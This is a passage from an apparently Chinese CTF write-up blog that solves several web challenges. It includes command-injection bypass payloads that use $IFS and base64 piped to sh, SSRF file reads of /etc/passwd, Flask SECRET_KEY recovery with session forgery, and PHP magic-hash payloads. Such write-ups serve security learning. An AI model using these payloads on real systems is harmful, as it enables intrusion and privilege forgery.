class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>

<p>这里有几种方法可以绕过</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;tac$IFS`ls`<br><span class="hljs-number">127.0.0.1</span>;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$<span class="hljs-number">1</span>-d|sh<br><span class="hljs-number">127.0.0.1</span>;a=ag;b=fl;cat$IFS$b$a.php<br>如果<span class="hljs-string">[]</span>没被禁用也可以<br><span class="hljs-number">127.0.0.1</span>;a=f;cat$IFS<span class="hljs-string">[e-g]</span>lag<br></code></pre></td></tr></table></figure>

<h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><p><img src="/images/2192F558557E46a38BA5C25E5C73F1FC.png" srcset="/img/loading.gif" lazyload><br>有个链接指向baidu<br>链接的话首先考虑能不能读文件，先嘟嘟&#x2F;etc&#x2F;passwd<br><img src="/images/74B542F0387242528E1A6D7C29F57EDA.png" srcset="/img/loading.gif" lazyload><br>试了一下flag不能读<br>看一看&#x2F;proc&#x2F;self&#x2F;cmdline有什么内容<br><img src="/images/A3DAF9A9C09D4362A1E75BDAA52F3DD5.png" srcset="/img/loading.gif" lazyload><br>url参数读一下app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>encoding:utf-<span class="hljs-number">8</span><br><span class="hljs-keyword">import</span> re, random, uuid, urllib<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request<br><br>app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">True</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;www-data&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    <span class="hljs-keyword">try</span>:<br>        url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        m = re.findall(<span class="hljs-string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)<br>        n = re.findall(<span class="hljs-string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> m <span class="hljs-keyword">or</span> n:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No Hack&#x27;</span><br>        res = urllib.urlopen(url)<br>        <span class="hljs-keyword">return</span> res.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(ex)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no response&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">and</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;fuck&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>).read()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access denied&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<br>        debug=<span class="hljs-literal">True</span>,<br>        host=<span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    )<br></code></pre></td></tr></table></figure>
<p>获得源码<br>简单看一下，重要的几行代码</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">random<span class="hljs-selector-class">.seed</span>(uuid<span class="hljs-selector-class">.getnode</span>()) <span class="hljs-selector-id">#uuid</span><span class="hljs-selector-class">.getnode</span>()是靶机的mac地址<br>app<span class="hljs-selector-class">.config</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>]</span> = <span class="hljs-built_in">str</span>(random<span class="hljs-selector-class">.random</span>()*<span class="hljs-number">233</span>)<br></code></pre></td></tr></table></figure>

<p>只要知道了种子值为多少，就能知道密钥是什么<br>mac地址在&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address中存储<br>获得mac地址为76:12:00:da:b0:2f 其本身就是16进制</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x761200dab02f</span><br></code></pre></td></tr></table></figure>
<p>知道了种子，哪个就可以推出密钥了,这里要用python2运行，因为靶机是python2，区别是python2与python3生成的位数不同</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">import</span> random<br><br>random.seed(<span class="hljs-number">0x761200dab02f</span>)<br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(str(random.random()*<span class="hljs-number">233</span>))</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">-&gt;</span><span class="hljs-number">179.873037007</span><br></code></pre></td></tr></table></figure>

<p>然后再看</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">session</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;www-data&#x27;</span><br></code></pre></td></tr></table></figure>
<p>主页把username默认为www-data，而</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>def flag():<br>    <span class="hljs-keyword">if</span> session and session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;fuck&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>).read()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access denied&#x27;</span><br></code></pre></td></tr></table></figure>

<p>当username为fuck时会返回flag<br>看一下我们的session</p>
<p><img src="/images/BCC08DDB5537412d915C5F92E0CF9DBC.png" srcset="/img/loading.gif" lazyload><br>这个session好像jwt啊，但是不是的<br><img src="/images/5EA6865C8628460f8D2909F326522F4B.png" srcset="/img/loading.gif" lazyload><br>这里username对应的是base64编码后的www-data<br>我们把这一段截取出来，把fuck填进去</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&#123;&quot;username&quot;:&#123;&quot; <span class="hljs-selector-tag">b</span>&quot;:<span class="hljs-string">&quot;fuck&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>
<p>接下来利用<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">flask_session_cookie_manager</a>伪造session</p>
<p>使用这个脚本伪造session</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> flask_session_cookie_manager3.<span class="hljs-keyword">py</span> encode -s <span class="hljs-string">&#x27;179.873037007&#x27;</span> -t <span class="hljs-string">&quot;&#123;&#x27;username&#x27;: b&#x27;fuck&#x27;&#125;&quot;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/6E0135608F19422b8C0FB5A41E977D8E.png" srcset="/img/loading.gif" lazyload><br>&#x2F;flag下把生成的session替换原来的session</p>
<p><img src="/images/F31AF79AC09840fcB45B03D66BE164D0.png" srcset="/img/loading.gif" lazyload></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/since_2020/article/details/119543172">flask session伪造admin身份</a></p>
<h2 id="moectf2024-静态网页"><a href="#moectf2024-静态网页" class="headerlink" title="moectf2024 -静态网页"></a>moectf2024 -静态网页</h2><p>hint：无意间发现 Sxrhhh 的个人博客。但是好像是静态博客，应该没什么攻打的必要了。。。</p>
<p>网页确实是静态网页，查看源码也没有有效的信息，但是发现右下角有一个可以交互的人物，抓一下包看有什么资源可以利用，抓包发现页面调用了<br><img src="/images/E84ACFB2B7844a6bB4AC93F317BB8382.png" srcset="/img/loading.gif" lazyload><br>进入final1l1l_challenge.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;final1l1l_challenge.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$a</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-variable">$b</span>[<span class="hljs-variable">$a</span>]) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;noooooooooooo&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;Notice the param type!&#x27;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;Where is your param?&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>了解一下</p>
<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-built_in">$b</span>[<span class="hljs-built_in">$a</span>]#若<span class="hljs-built_in">$a</span>==<span class="hljs-number">0</span>,则返回<span class="hljs-built_in">$b</span>第一个字符或数组第一个的值<br></code></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span><br>?<span class="hljs-attribute">a</span>=QNKCDZO<br>POST<br><span class="hljs-attribute">b</span>=0%00<br></code></pre></td></tr></table></figure>
<p>对于$a&#x3D;&#x3D;0<br>弱比较下，当一个字符串与数字进行比较时，PHP会尝试将字符串转换为一个数字。如果字符串的第一个字符是一个数字，那么PHP会将其转换为该数字；如果字符串的第一个字符不是数字，那么PHP会将整个字符串转换为0<br>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，PHP会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同。</p>
<h2 id="moectf2024-勇闯铜人阵"><a href="#moectf2024-勇闯铜人阵" class="headerlink" title="moectf2024 勇闯铜人阵"></a>moectf2024 勇闯铜人阵</h2><p><img src="/images/87D69C227E7D401c91396D0920D92184.png" srcset="/img/loading.gif" lazyload><br>好久没写脚本了，先拉坨屎山</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import re<br><br>a =requests.session()<br><br>url = <span class="hljs-string">&#x27;http://127.0.0.1:57542/restart?&#x27;</span><br>data=&#123;<br>    <span class="hljs-string">&quot;player&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;direct&quot;</span>:<span class="hljs-string">&#x27;弟子明白&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">while</span> 1:<br>    <span class="hljs-attribute">b</span>=a.post(url=url,data=data)<br>    tex = re.findall(r<span class="hljs-string">&#x27;&lt;h1 id=&quot;status&quot;&gt;\s*(.*?)\s*&lt;/h1&gt;&#x27;</span>, b.text)<br>    # <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;text=&#x27;</span>,b.text)<br>    <span class="hljs-built_in">print</span>(tex)<br>    <span class="hljs-attribute">str1</span>=str(tex)<br>    str1 = str1.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;str1=&#x27;</span>,str1)<br>    mark = 0<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> str1:<br>        <span class="hljs-keyword">if</span> <span class="hljs-attribute">j</span>==&#x27;,&#x27;:<br>            <span class="hljs-attribute">mark</span>=1  #两个<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;moectf&#x27;</span> <span class="hljs-keyword">in</span> b.text:<br>        <span class="hljs-built_in">print</span>(b.text)<br>        break<br>    <span class="hljs-keyword">if</span> mark ==0:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;嗨嗨嗨&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-attribute">str1</span>==&#x27;1&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>]=<span class="hljs-string">&quot;北方&quot;</span><br>        elif <span class="hljs-attribute">str1</span>==&#x27;2&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;东北方&quot;</span><br>        elif str1 == <span class="hljs-string">&#x27;3&#x27;</span>:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;东方&quot;</span><br>        elif <span class="hljs-attribute">str1</span>==&#x27;4&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;东南方&quot;</span><br>        elif <span class="hljs-attribute">str1</span>==&#x27;5&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;南方&quot;</span><br>        elif <span class="hljs-attribute">str1</span>==&#x27;6&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;西南方&quot;</span><br>        elif str1 == <span class="hljs-string">&#x27;7&#x27;</span>:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;西方&quot;</span><br>        elif <span class="hljs-attribute">str1</span>==&#x27;8&#x27;:<br>            data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;西北方&quot;</span><br>    elif <span class="hljs-attribute">mark</span>==1:<br>        mark1 = 0  # 判断逗号<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;嘻嘻嘻&#x27;</span>)<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> str1:<br>            <span class="hljs-built_in">print</span>(k)<br>            <span class="hljs-keyword">if</span> <span class="hljs-attribute">k</span>==&#x27;1&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;北方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;1&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;北方一个&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;2&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;东北方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;2&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;东北方一个&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;3&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;东方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;3&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;东方一个&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;4&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;东南方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;4&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;东南方一个&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;5&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;南方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;5&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;南方一个&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;6&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;西南方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;6&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;西南方一个&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;7&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;西方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;7&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;西方一个&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;8&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;西北方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;8&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;西北方一个&quot;</span><br><br><br><br>    <span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;url=&#123;url&#125; data=&#123;data&#125;&#x27;</span>)<br>    url = <span class="hljs-string">&#x27;http://127.0.0.1:57542/&#x27;</span><br><br><br></code></pre></td></tr></table></figure>

<h2 id="moectf2024-Re-从零开始的-XDU-教书生活"><a href="#moectf2024-Re-从零开始的-XDU-教书生活" class="headerlink" title="moectf2024 Re: 从零开始的 XDU 教书生活"></a>moectf2024 Re: 从零开始的 XDU 教书生活</h2><p>提示：<br>使用脚本重复发送请求直到所有人都签上到即可。如果思路受阻或者不知道怎么写脚本，欢迎通过下方锤子询问出题人。<br>建议先从浏览器简单看下该做什么再去看代码细节，直接看代码很难理清思路。<br>&#x2F;v2&#x2F;apis&#x2F;sign&#x2F;refreshQRCode 该接口用于刷新二维码并返回新的二维码的信息。如何组装一个签到链接可参考网页源码。（或者随便拿个签到二维码看一下指向的链接也差不多能搞懂）</p>
<p>你成为了 XDU 的一个教师，现在你的任务是让所有学生签上到（需要从学生账号签上到，而不是通过教师代签）。 注意：</p>
<p>本题约定：所有账号的用户名 &#x3D;&#x3D; 手机号 &#x3D;&#x3D; 密码。教师账号用户名：10000。<br>当浏览器开启签到页面时，二维码每 10 秒刷新一次，使用过期的二维码无法完成签到。（浏览器不开启签到页面时，不会进行自动刷新，可以持续使用有效的二维码，除非手动发送刷新二维码的请求） 当你完成任务后，请结束签到活动。你将会获得 Flag 。 本题的部分前端页面取自超星学习通网页，后端与其无关，仅用作场景还原，请勿对原网站进行任何攻击行为！</p>
<p>先通过10000登录老师账号，看一下有多少人需要我们签的<br><img src="/images/6E4C0BDE7416417b9C6CF6EEC81C2041.png" srcset="/img/loading.gif" lazyload><br>这么多人，必须要写一个脚本了<br>先登录学生账号抓包看看<br><img src="/images/29AD5531EE51424c96B6C4ED066768DA.png" srcset="/img/loading.gif" lazyload><br>发现我们的账号密码被加密了，而cookie是随机生成的不可预测<br>再看看附件下载的app.py<br>这两个函数比较重要，我们的账号密码是AES加密<br><img src="/images/597FD934521F4c5e8F5C80CA4AADC9FB.png" srcset="/img/loading.gif" lazyload><br><img src="/images/8F105B596C7544e58B0146CE6DE2D587.png" srcset="/img/loading.gif" lazyload></p>
<p>根据代码写出AES加密</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><br>def encrypt_by_aes<span class="hljs-function"><span class="hljs-params">(plaintext: str, key: str, iv: str)</span> -&gt;</span> str:<br>    key_bytes = key.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    iv_bytes = iv.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    cipher = AES.<span class="hljs-keyword">new</span>(key_bytes, AES.MODE_CBC, iv_bytes)<br>    <br>    <span class="hljs-comment"># 将明文转为字节并进行填充（填充到块大小的倍数，通常是16字节）</span><br>    plaintext_bytes = pad(plaintext.encode(<span class="hljs-string">&quot;utf-8&quot;</span>), AES.block_size)<br>    <br>    <span class="hljs-comment"># 加密</span><br>    encrypted_bytes = cipher.encrypt(plaintext_bytes)<br>    <br>    <span class="hljs-comment"># 将加密后的字节进行 base64 编码</span><br>    encrypted = base64.b64encode(encrypted_bytes).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <br>    <span class="hljs-keyword">return</span> encrypted<br><br><br>def decrypt_by_aes<span class="hljs-function"><span class="hljs-params">(encrypted: str, key: str, iv: str)</span> -&gt;</span> str:<br>    key_bytes = key.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    iv_bytes = iv.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    cipher = AES.<span class="hljs-keyword">new</span>(key_bytes, AES.MODE_CBC, iv_bytes)<br><br>    <span 